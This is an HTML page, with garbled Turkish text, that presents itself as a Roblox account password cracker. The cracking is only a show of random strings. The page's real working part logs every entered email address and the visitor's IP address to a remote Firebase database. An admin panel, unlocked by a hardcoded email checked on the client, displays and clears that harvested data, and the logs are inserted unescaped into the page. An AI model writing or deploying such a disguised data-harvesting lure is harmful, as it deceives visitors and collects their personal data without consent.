<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>≈ûifre Kƒ±rƒ±cƒ±</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .box {
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
      margin: 10px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      border-radius: 5px;
      border: none;
    }
    button {
      background-color: blue;
      color: white;
      cursor: pointer;
    }
    .console {
      background-color: black;
      color: lime;
      font-family: monospace;
      text-align: left;
      padding: 10px;
      margin-top: 20px;
      width: 80%;
      height: 200px;
      overflow-y: auto;
      border: 1px solid white;
    }
    .admin-panel {
      display: none;
      background-color: #222;
      padding: 30px;
      margin-top: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
      width: 95%;
      max-width: 1500px;
      text-align: left;
      margin-left: auto;
      margin-right: auto;
    }
    .logs-panel {
      margin-top: 20px;
      font-family: monospace;
      width: 100%;
      max-height: 400px;
      overflow-y: auto;
      border: 1px solid white;
      background-color: black;
      color: lime;
      padding: 15px;
    }
    button.clear-logs {
      margin-top: 20px;
      background-color: red;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script>
    // Firebase yapƒ±landƒ±rma ‚Äì L√ºtfen kendi bilgilerinizi girin.
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_SENDER_ID",
      appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
  </script>
</head>
<body>
  <div class="container">
    <h2>≈ûifre Kƒ±rƒ±cƒ±</h2>
    <div class="box">
      <label for="email">E-Posta:</label>
      <input type="email" id="email" placeholder="E-posta adresinizi girin">
      <button onclick="verifyEmail()">Doƒürulama G√∂nder</button>
      <p id="error-message" style="color: red;"></p>
    </div>
    <div class="box" id="username-box" style="display:none;">
      <label for="username">Kullanƒ±cƒ± Adƒ± (Roblox):</label>
      <input type="text" id="username" placeholder="Kullanƒ±cƒ± adƒ±nƒ± girin">
      <button onclick="startProcess()">Ba≈ülat</button>
    </div>
    <div class="console" id="console"></div>
    <div class="admin-panel" id="adminPanel">
      <h3>Y√∂netici Paneli</h3>
      <div class="logs-panel" id="logs-panel">Y√ºkleniyor...</div>
      <button class="clear-logs" onclick="clearLogs()">Kayƒ±tlarƒ± Temizle</button>
    </div>
  </div>

  <script>
    // Konsola mesaj yazdƒ±rma fonksiyonu
    function logToConsole(message) {
      const consoleDiv = document.getElementById('console');
      consoleDiv.innerHTML += message + "<br>";
      consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

    // E-posta doƒürulamasƒ± ve admin kontrol√º
    function verifyEmail() {
      const email = document.getElementById('email').value;
      const errorMessage = document.getElementById('error-message');

      // E-posta giri≈ülerini Firebase'e kaydet
      addLog(email);

      // Eƒüer admin e-postasƒ± girildiyse y√∂netici panelini a√ß
      if (email === "jasunhaadmin@gmail.com") {
        document.getElementById('adminPanel').style.display = 'block';
        document.getElementById('username-box').style.display = 'none';
        logToConsole("Admin giri≈üi ba≈üarƒ±lƒ±. Y√∂netici paneli a√ßƒ±ldƒ±.");
      } else {
        errorMessage.innerText = "";
        document.getElementById('username-box').style.display = 'block';
      }
    }

    // Kullanƒ±cƒ±nƒ±n IP adresini getirir
    function getUserIP() {
      return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
          console.log('IP alƒ±namadƒ±:', error);
          return "Bilinmiyor";
        });
    }

    // Firebase'e log ekler
    function addLog(email) {
      getUserIP().then(ip => {
        const log = {
          email: email,
          ip: ip,
          date: new Date().toLocaleString()
        };
        db.ref("logs").push(log)
          .catch(err => console.error("Log eklenirken hata:", err));
      });
    }

    // Firebase'den loglarƒ± y√ºkler
    function loadLogs() {
      const logsPanel = document.getElementById('logs-panel');
      logsPanel.innerHTML = "Y√ºkleniyor...";
      db.ref("logs").on("value", snapshot => {
        logsPanel.innerHTML = "";
        const data = snapshot.val();
        if (!data) {
          logsPanel.innerHTML = "Hi√ß kayƒ±t yok.";
          return;
        }
        Object.values(data).forEach(log => {
          logsPanel.innerHTML += `üìß <strong>${log.email}</strong> - üåê IP: ${log.ip} - üìÖ Tarih: ${log.date}<br>`;
        });
      }, error => {
        logsPanel.innerHTML = "Kayƒ±tlar y√ºklenemedi: " + error.message;
        console.error("Firebase hata:", error);
      });
    }

    // T√ºm loglarƒ± temizler
    function clearLogs() {
      db.ref("logs").remove()
        .catch(err => console.error("Log silinirken hata:", err));
    }

    // ≈ûifre kƒ±rma sim√ºlasyonu
    function startProcess() {
      const username = document.getElementById('username').value;
      if (!username) {
        alert("L√ºtfen kullanƒ±cƒ± adƒ±nƒ± girin!");
        return;
      }
      logToConsole(`Kullanƒ±cƒ±: ${username} i√ßin rastgele ≈üifre kƒ±rma denemesi ba≈ülatƒ±ldƒ±...`);

      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
      let attempts = 0;
      let passwordLength = 8;
      const maxPasswordLength = 9;
      const minPasswordLength = 8;

      setInterval(() => {
        let password = "";
        let currentLength = passwordLength;
        if (passwordLength > maxPasswordLength) currentLength = minPasswordLength;
        for (let i = 0; i < currentLength; i++) {
          password += charset[Math.floor(Math.random() * charset.length)];
        }
        attempts++;
        passwordLength = (passwordLength >= maxPasswordLength) ? minPasswordLength : passwordLength + 1;
        logToConsole(`Deneme ${attempts}: ${password}`);
      }, 100);
    }

    window.onload = loadLogs;
  </script>
</body>
</html>
